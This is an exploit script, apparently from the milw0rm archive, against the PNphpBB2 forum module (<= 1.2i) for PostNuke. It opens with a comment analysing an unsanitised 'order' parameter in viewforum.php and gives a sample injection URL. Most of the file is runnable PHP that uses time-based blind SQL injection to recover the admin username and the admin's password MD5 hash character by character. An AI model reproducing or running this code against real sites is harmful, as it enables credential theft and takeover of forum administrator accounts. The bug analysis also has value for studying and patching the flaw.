/*
[i] PNphpBB2 "viewforum.php" SQL Injection Blind Password Hash Fishing Exploit
[i] Vulnerable versions: PNphpBB2 <= 1.2i (current last version)
[i] Bug discovered by: Coloss
[i] Exploit by: Coloss
[i] Date: 03.07.2007

[Notes]
[->] You need at least 2 posts in the forum.
[->] Thanks to waraxe for exploit structure... I have saved much time :)

[Tested]
[->] Postnuke 0.764 with PNphpBB2 1.2i and MySQL 5.0.42
     Maybe with other MySQL versions SQL Query should be slightly different

[Bug Analysis]

File: viewforum.php

   387  if ( isset($HTTP_GET_VARS['order']) || isset($HTTP_POST_VARS['order']) )
   388  {
   389           $sort_order = isset($HTTP_GET_VARS['order']) ? $HTTP_GET_VARS['order'] : $HTTP_POST_VARS['order'];
   390  }

We can handle '$sort_order'...

   415  $sql = "SELECT t.*, u.username, u.user_id, u2.username as user2, u2.user_id as id2, p.post_username, p2.post_username AS post_username2, p2.post_time
   416          FROM " . TOPICS_TABLE . " t, " . USERS_TABLE . " u, " . POSTS_TABLE . " p, " . POSTS_TABLE . " p2, " . USERS_TABLE . " u2
   417          WHERE t.forum_id = $forum_id
   418                  AND t.topic_poster = u.user_id
   419                  AND p.post_id = t.topic_first_post_id
   420                  AND p2.post_id = t.topic_last_post_id
   421                  AND u2.user_id = p2.poster_id
   422                  AND t.topic_type <> " . POST_ANNOUNCE . "
   423                  $limit_topics_time
   424          ORDER BY t.topic_type DESC, $sort_method $sort_order
   425          LIMIT $start, ".$board_config['topics_per_page'];

... and this value is used without any check in the sql query.^

The only "problem" could be that the SQL injection is only possible after an 'ORDER BY' statement... but we should be able (with appropriate MySQL version) to inject a subquery.

In this case we can request something like this: 
http://www.site.com/postnuke/?module=PNphpBB2&file=viewforum&f=1&order=ASC, (SELECT user_password FROM pn_phpbb_users WHERE user_id=2 AND IF(ORD(SUBSTR(user_password,1,1))>52,BENCHMARK(2500000,MD5(71337)),1))

With this kind of query we can use an 'if' statement to discover each character of the admin's password hash, analyzing the delay time of server's answers.
In fact if the 'if' statement results true (ORD() returns the ascii value of a character) the md5() function 'll be repeated 2500000 times and you 'll get a big delay.

For more informations study the SQL Functions list.
*/

$testcnt = 300000;				// Use bigger numbers, if server is slow
$fid = 1;					// Forum ID
$prefix = "pn_";				// SQL Table prefix
$adminid = 2;					// Admin user id, default: 2

$opts = getopt("u:f:U:P:o:");

print 
"[i] PNphpBB2 \"viewforum.php\" SQL Injection Blind Password Hash Fishing Exploit
[i] Vulnerable versions: PNphpBB2 <= 1.2i (current last version)
[i] Bug discovered by: Coloss
[i] Exploit by: Coloss
[i] Date: 03.07.2007\n\n";


if ($opts[u] == '')
	die (help($argv[0]));

if (strncmp($opts[u], "http",4))
	$url = 'http://'.$opts[u];
else
	$url = $opts[u];

if ($opts[U])
	$user = $opts[U];
if ($opts[P])
	$hash = $opts[P];
if ($opts[o])
	$file = $opts[o];
if ($opts[f])
	$fid = (int) $opts[f];

echo "[+] Target: $url\n";

$norm_delay = 0;
echo "[+] Testing probe delays... \n"; 
$norm_delay = get_normdelay($testcnt);
echo "[-] Normal delay: $norm_delay deciseconds\n";

if (!$user) {
	echo "[+] Trying to find admin username... ";
	$user = find_username();
}

$field = 'user_password';

if (!$hash) {
	echo "\n[+] Trying to find Password MD5 Hash...\n\n";
	$hash = get_hash();
}

echo"[-] Finished!\n";

owrite("\n[->] Target: $url\n");
owrite("[->] Username: $user\n");
owrite("[->] Password MD5 Hash: $hash\n");

function get_hash()
{
	global $field;

	$len = 32;
	$out = '';
   
	for($i = 1; $i < $len + 1; $i ++) {
		$ch = get_hashchar($i);
		$out .= "$ch";
		echo "[->] Current '$field' ($i): $out \n";
	}
	echo "\n[-] Found Password Hash: $out\n\n";
	return $out;
}


function get_hashchar($pos)
{
	global $fid, $testcnt, $field, $adminid, $prefix;
	$char = '';
	$cnt = $testcnt * 5;

	$sql = "ASC, (SELECT ".$field." FROM ".$prefix."phpbb_users WHERE user_id=".$adminid." AND IF(ORD(SUBSTR(".$field.",".$pos.",1))%s,BENCHMARK(".$cnt.",MD5(71337)),1))";
	$post = "name=PNphpBB2&file=viewforum&f=".$fid."&order=".$sql;

	$req = sprintf($post, ">57");
	
	$letter = test_condition($req);

	if ($letter) {
		$min = 97;
		$max = 102;
	}
	else {
		$min = 48;
		$max = 57;
	}

	$curr = 0;
   
	while(1) {
		$area = $max - $min;
		if ($area < 2 ) {
			$req = sprintf($post, "=$max");

			$eq = test_condition($req);
         
			if($eq)
				$char = chr($max);
			else
				$char = chr($min);
			break;
		}

		$half = intval(floor($area / 2));
		$curr = $min + $half;
      
		$req = sprintf($post, ">$curr");
		echo $req;

		$bigger = test_condition($req);
      
		if ($bigger)
			$min = $curr;
		else
			$max = $curr;
	}
	return $char;
}

function test_condition($req)
{
	global $url, $norm_delay;

	$bool = false;
   
	$start = getmicrotime();
	$buff = Send($url, $req);
	$end = getmicrotime();

	$diff = $end - $start;
	$delay = intval($diff * 10);
   
	if ($delay > ($norm_delay * 2))
		$bool = true;
	return $bool;
}


function get_normdelay($testcnt)
{
	$nda = test_md5delay(1);
	$da = test_md5delay($testcnt);
	$ndb = test_md5delay(1);
	$db = test_md5delay($testcnt);
	$ndc = test_md5delay(1);
	$dc = test_md5delay($testcnt);

	$mean_delayed = intval(($da + $db + $dc) / 3);
   
	return $mean_delayed;
}

function test_md5delay($cnt)
{
	global $url, $fid, $prefix, $adminid, $prefix;
   
	$delay = -1;
	
	$sql = "ASC, (SELECT user_password FROM ".$prefix."phpbb_users WHERE u.user_id=".$adminid." AND IF(LENGTH(user_password)>31,BENCHMARK(".$cnt.",MD5(71337)),1))";
	$req = "name=PNphpBB2&file=viewforum&f=".$fid."&order=".$sql;

	$start = getmicrotime();
	$buff = Send($url, $req);
	$end = getmicrotime();

	if (strstr($buff, "Could not obtain topic information"))
		die("[X] Something is wrong... (maybe SQL Query)\n");
	else if (strstr($buff, "The forum you selected does not exist"))
		die("[X] The Forum doesn't exist.. change 'fid' value\n");

	$diff = $end - $start;
	$delay = intval($diff * 10);

	return $delay;
}

function getmicrotime()
{
	list($usec, $sec) = explode(" ", microtime());
	return ((float)$usec + (float)$sec);
}

function Send($url, $req='')
{
	$ch = curl_init();

	curl_setopt ($ch, CURLOPT_URL, $url);
	curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, 60);

	if ($req) {
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $req);
	}

	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
	curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');

	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);

	$html = curl_exec($ch);
	curl_close($ch);
   
	return $html;
}


function help ($prog)
{
	print "[-] Usage: $prog 
	 -u  <url>	-> Sets Target url
	[-f] <id>	-> Sets forum id
	[-U] <user>	-> Sets username
	[-P] <pass>	-> Sets password
	[-o] <file>	-> Writes results to a file\n";
}


function owrite ($msg)
{
	global $file;

	echo $msg;

	if ($file) {
		if (!($h = fopen($file, 'ab'))) {
			echo "[X] Cannot open '$file'\n";
			return;
		}
		if (fwrite($h, $msg) === FALSE)
			echo "[X] Cannot write to '$file'\n";
		fclose($h);
	}
}	

function find_username ()
{
	global $url, $fid, $adminid;

	$req = "name=PNphpBB2&file=viewforum&f=".$fid;
	$str = "file=profile&amp;mode=viewprofile&amp;u=".$adminid;

	$html = Send($url, $req);

	if (strstr($html, $str)) {
		$u = substr($html,strpos($html,$str)+strlen($str),strpos(substr($html,strpos($html,$str)+strlen($str),strlen($html)), "<"));
		$u = substr($u, strpos($u, ">")+1, strlen($u)-strpos($u, ">"));
		echo "found: '$u'\n";
	}
	else
		echo "failed: probably he has not posted in this forum (or maybe he has a different user id)\n";
	return $u;
}
?>

# milw0rm.com [2007-07-03]
